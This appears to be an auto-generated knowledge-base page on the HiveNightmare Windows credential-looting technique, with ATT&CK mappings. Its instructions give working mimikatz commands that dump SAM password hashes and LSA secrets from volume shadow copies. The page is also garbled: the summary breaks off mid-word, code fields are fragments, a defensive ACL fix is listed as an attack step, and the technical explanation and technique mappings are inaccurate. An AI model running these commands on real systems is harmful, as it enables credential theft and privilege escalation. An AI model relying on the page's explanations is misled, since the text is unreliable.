---
id: 1a59eee5-6c97-4aa5-beae-f12a76079a36
name: HiveNightmare Password Looting
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.860643+00:00'
updated_at: '2023-04-10T20:37:52.884337+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]'
tags:
- '[[EoP - Looting for passwords]]'
- '[[HiveNightmare]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Extract account from SAM databases]]'
- '[[Extract secrets from SECURITY]]'
- '[[List shadow copies]]'
- '[[Token whoami]]'
- '[[Viewing Permissions for a File or Folder using icacls]]'
---

# HiveNightmare Password Looting

## Summary

HiveNightmare is a privilege escalation technique that allows attackers to extract sensitive information from the Security Account Manager (SAM) database, including password hashes. This procedure involves exploiting a vulnerability in the Windows operating system, which allows attackers to read th

## Description

# Description

HiveNightmare is a privilege escalation technique that allows attackers to extract sensitive information from the Security Account Manager (SAM) database, including password hashes. This procedure involves exploiting a vulnerability in the Windows operating system, which allows attackers to read the contents of the SAM database even if they do not have the necessary permissions. By doing so, attackers can extract password hashes and use them to gain access to other systems or resources.

Technical Explanation: HiveNightmare takes advantage of a vulnerability in the Windows Volume Shadow Copy Service (VSS) that allows attackers to read the contents of the SAM database. Specifically, HiveNightmare targets the System Protection settings for the SAM database, which can be accessed through the registry. By manipulating the registry, attackers can extract the contents of the SAM database, including password hashes.

Business Value: HiveNightmare is a powerful tool for attackers looking to escalate their privileges and gain access to sensitive information. By extracting password hashes, attackers can gain access to other systems and resources, potentially leading to data theft, financial loss, and reputational damage.

## Requirements

1. Access to the Windows registry

1. Authentication on the target system

1. Access to the Volume Shadow Copy Service

## Defense

1. Ensure that the latest security updates and patches are installed on all Windows systems

1. Restrict access to the registry to only authorized users and applications

1. Monitor for suspicious activity related to the Volume Shadow Copy Service

## Objectives

1. Gain access to the SAM database

1. Extract password hashes

1. Use password hashes to escalate privileges

# Instructions

1. Run the following command in Command Prompt: icacls <file/folder path>

**Code**: [[icacls]]

> This command is used to check the permissions of a file or folder. It can be used to identify potential vulnerabilities in the system by checking if unauthorized users have access to sensitive files or folders. The output of the command will display the current permissions for the specified file or folder, including the users and groups that have access.

**Command** ([[Viewing Permissions for a File or Folder using icacls]]):

```bash
icacls C:\Windows\System32\notepad.exe
```

2. Use the icacls command to modify the access control list (ACL) of the SAM configuration file. The ACL should only grant full control to the built-in administrators group and the system account. Remove the read and execute permissions for regular users.

**Code**: [[C:\Windows\System32> icacls config\SAM
config\SAM ]]

> The icacls command is used to view and modify ACLs for files and folders. In this case, we are modifying the ACL for the SAM configuration file. The 'BUILTIN\Users:(I)(RX)' entry grants read and execute permissions to all regular users, which is not necessary and can be a security risk. By removing this entry, we ensure that only administrators and the system account have full control over the file, while regular users have no access.

3. Use the `mimikatz` tool to extract credentials from shadow copies of the Windows file system.

**Code**: [[mimikatz> token::whoami /full

# List shadow copie]]

> This command is useful for extracting credentials from a compromised Windows system, particularly if the attacker has limited privileges and cannot access the live system. By accessing shadow copies of the file system, the attacker can extract sensitive information such as user account credentials and other secrets.

**Command** ([[Token whoami]]):

```bash
mimikatz> token::whoami /full
```

**Command** ([[List shadow copies]]):

```bash
mimikatz> misc::shadowcopies
```

**Command** ([[Extract account from SAM databases]]):

```bash
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

**Command** ([[Extract secrets from SECURITY]]):

```bash
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]

## Commands Used

- [[Extract account from SAM databases]]
- [[Extract secrets from SECURITY]]
- [[List shadow copies]]
- [[Token whoami]]
- [[Viewing Permissions for a File or Folder using icacls]]

## Tags

- [[EoP - Looting for passwords]]
- [[HiveNightmare]]
- [[Windows - Privilege Escalation]]
